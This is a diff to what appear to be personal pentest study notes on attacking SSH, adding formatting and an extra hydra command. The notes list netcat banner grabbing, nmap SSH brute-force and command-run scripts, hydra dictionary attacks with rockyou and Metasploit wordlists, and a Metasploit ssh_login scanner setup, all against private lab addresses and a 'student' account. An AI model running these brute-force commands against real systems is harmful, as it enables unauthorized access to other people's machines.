@@ -21,12 +21,13 @@ Used to connect to securely connect to remote machines.
 `ssh -p 22 user@192.168.4.3`
 
 ---
+
 # #Tools
 ## netcat
 `nc 192.168.13.3 22` 
 - grabs banner
 
-## nmap
+## #nmap
 - --script
 	- ssh2-enum-algos
 		- shows key algorithms
@@ -39,14 +40,20 @@ Used to connect to securely connect to remote machines.
 		- args : userdb, passdb, timeout
 		- has its own wordlist
 	- ssh-run 
-		- --script-args"username=student,password="",cmd=ls"
+		- `--script-args"username=student,password="",cmd=ls"`
 
-## hydra
+## #hydra
 dictionary attack
 `hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.7.3 ssh`
 
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
+-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
+192.168.7.3 -t 4 ssh 
+```
 
-## msfconsole
+
+## #msfconsole
 - use auxiliary/scanner/ssh/ssh_login
 	- options
 	- set rhosts 192.26.34.2
@@ -54,4 +61,3 @@ dictionary attack
 	- set STOP_ON_SUCCESS true
 	- set verbose true
 	- run
-- 
